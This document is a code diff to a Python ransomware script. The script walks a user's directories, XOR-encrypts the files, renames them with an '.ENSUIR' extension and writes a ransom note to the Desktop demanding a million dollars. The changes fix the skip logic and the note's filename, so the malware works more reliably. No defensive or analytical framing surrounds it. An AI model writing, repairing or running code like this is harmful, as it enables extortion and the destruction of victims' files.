@@ -10,8 +10,10 @@ def start(userdir):
             target = os.path.join(root,name)
             ext = os.path.splitext(name)
             if ext[1] in exts and ext[0][0] != "#" and ext[0][0] != "$":
-                if ext == ".ENSUIR" o
-                encrypt(target)
+                if ext[1] == ".ENSUIR" or ext[0] == 'README_TO_DECRYPT':
+                    pass
+                else:
+                    encrypt(target)
 
 
 def xord(data):
@@ -20,30 +22,21 @@ def xord(data):
 
 #It will XOR the data from a file once with b^0xA8
 def encrypt(file):
-    if "README_TO_DECRYPT" in os.path.splitext(file)[0]:
+    try:
+        with open(file, 'rb') as f:
+            data = f.read()
+        with open(file, 'wb') as fp:
+            fp.write(xord(data))
+            os.rename(file, file+".ENSUIR")
+    except:
         pass
-    else:
-        try:
-            with open(file, 'rb') as f:
-                data = f.read()
-        except:
-            pass
-        try:
-            with open(file, 'wb') as fp:
-                fp.write(xord(data))
-            if os.path.splitext(file)[1] == ".ENSUIR":
-                pass
-            else:
-                os.rename(file, file+".ENSUIR")
-        except:
-            pass
 
 def note(userdir):
     note = """ 
     lmao you got owned,
     I need 1 million dollars to ransomguy@gottem.com
     """
-    notepath = os.path.join(userdir, "Desktop", "README_TO_DECRPYPT")
+    notepath = os.path.join(userdir, "Desktop", "README_TO_DECRYPT.txt")
     with open(notepath, 'w') as f:
         f.write(note)
 
